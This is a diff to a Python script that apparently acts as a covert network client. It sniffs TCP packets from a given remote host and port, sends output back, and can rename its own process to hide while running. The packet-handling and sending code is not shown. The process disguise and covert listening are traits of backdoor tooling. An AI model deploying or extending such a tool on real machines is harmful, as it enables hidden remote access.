@@ -14,25 +14,32 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-d",
                     "--destination",
                     type=str,
-                    help="IP of remote host, to display output to",
+                    help="IP of remote host to send output to",
                     required=True)
 
 parser.add_argument("-p",
                     "--port",
                     type=str,
-                    help="Port of remote host",
+                    help="Port of remote host to send output",
                     required=True)
+
+parser.add_argument("-s",
+                    "--sniff",
+                    type=str,
+                    help="Port to sniff incoming packets from the remote client",
+                    required=True)    
 
 parser.add_argument("-n",
                     "--name",
                     type=str,
                     help="Process name of this app while running",
-                    required=True)                    
+                    required=False)                    
 
 global args
 args = parser.parse_args()
 
-setproctitle.setproctitle(args.name)
+if args.name is not None:
+    setproctitle.setproctitle(args.name)
 
 
 def read_pkt(packet):
@@ -72,7 +79,7 @@ def main():
     print("Listening...\n")
 
     while True:
-        sniff(filter="ip and tcp and host 192.168.1.79", count=1, prn=read_pkt)
+        sniff(filter=f"ip and tcp and host {args.destination} and dst port {args.sniff}", count=1, prn=read_pkt)
 
 
 if __name__ == "__main__":
